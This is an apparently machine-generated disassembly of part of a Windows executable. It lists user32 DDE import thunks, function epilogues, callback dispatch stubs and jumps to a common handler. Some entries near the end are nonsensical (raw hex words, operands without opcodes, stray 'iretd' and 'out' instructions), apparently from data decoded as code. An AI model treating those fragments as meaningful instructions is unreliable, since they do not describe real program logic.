DdeDisconnect
jmp [ __import_lookup_table_15(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ __import_lookup_table_15(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ __import_lookup_table_15(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_15(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_15(user32:DdeNameService) ]
DdeClientTransaction
jmp [ DdeClientTransaction@IAT ]
DdeCreateDataHandle
jmp [ DdeCreateDataHandle@IAT ]
DdeAccessData
jmp [ DdeAccessData@IAT ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ DdeFreeDataHandle@IAT ]
DdeGetLastError
jmp [ DdeGetLastError@IAT ]
DdeQueryStringA
jmp [ __import_lookup_table_15(user32:DdeQueryStringA) ]
DdeCmpStringHandles
jmp [ DdeCmpStringHandles@IAT ]
sub_45dcc1
jmp sub_403994
sub_45dcc8
pop ebp
retn
sub_45dccc
sub [ rw-data ] 0x1
retn
sub_45ddee
out dx al
[ ecx + edi * 8 + 0x45 ]
sub_45e124
out dx al
jmp [ ebx + eax + 0x3b80046 ]
sub_45e782
jmp sub_403994
sub_45e789
pop ebx
mov esp ebp
pop ebp
retn
sub_45ea54
jmp sub_403994
sub_45ea5b
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_45ebdc
jmp sub_403994
sub_45ebe3
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ed21
jmp sub_403994
sub_45ed28
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45ee18
jmp sub_403994
sub_45ee1f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ef2e
jmp sub_403994
sub_45ef35
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45efe7
jmp sub_403994
sub_45efee
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45eff4
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_413828
pop ebx
retn
sub_45f008
mov eax [ eax + 0x40 ]
call sub_4138f0
retn
sub_45f152
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
sub_45f160
jmp sub_403994
j_sub_45f152
jmp sub_45f152
sub_45f167
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403994#9
jmp sub_403994
sub_45f21e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403994#8
jmp sub_403994
sub_45f2ee
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f682
jmp sub_403994
sub_45f689
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f838
mov [ eax + 0xc6 ] 0x0
retn
sub_45f91c
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_45f884
sub_45f93c
retn
sub_45f940
retn
sub_45f944
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403fe4
pop esi
pop ebx
retn
sub_45f958
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_403fe4
pop esi
pop ebx
retn
sub_45f96c
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_45f98c
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
j_sub_403994#7
jmp sub_403994
sub_45fb16
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fc28
retn
sub_45fc2c
retn
sub_45fd3d
jmp sub_403994
sub_45fd44
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403994#6
jmp sub_403994
sub_45fe20
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fe90
push ecx
push edx
call DdeAccessData
retn
sub_45fe98
push edx
call DdeUnaccessData
retn
sub_45ffb8
mov eax [ eax + 0x10 ]
call sub_45fbb4
retn
sub_460040
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41921c
j_sub_403994#5
jmp sub_403994
sub_460123
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4601b3
jmp sub_403994
sub_4601ba
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403994#4
jmp sub_403994
sub_46024a
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460254
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_403994#3
jmp sub_403994
sub_46039a
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4603a4
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4603b8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4605b4
jmp sub_403994
sub_4605bb
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46069b
jmp sub_403994
sub_4606a2
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
j_sub_403994#2
jmp sub_403994
sub_4607d4
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_403994
jmp sub_403994
sub_460a8c
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460a98
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_460b41
jmp sub_403994
sub_460b48
pop ebp
retn
sub_461e36
or esp [ ebp - 0x741c1c02 ]
mov al 0x7d
0xd3de0a11 0xe3e3
sub_4622c1
iretd
sub_46274c
mov ah 0x6a
movsd [ edi ] [ esi ]
fisttp [ ebx ]
iretd
sub_4628d3
[ eax - 0x59 ]
sub_46458c

sub_46495e
0x8760e3e3 0xcfc7
sub_464c73

sub_464c8a
jmp ebx
sub_465429

sub_4665dd
jmp sub_403994
sub_4665e4
pop ebp
retn
sub_46666f
jmp sub_403994
sub_466676
pop ebp
retn
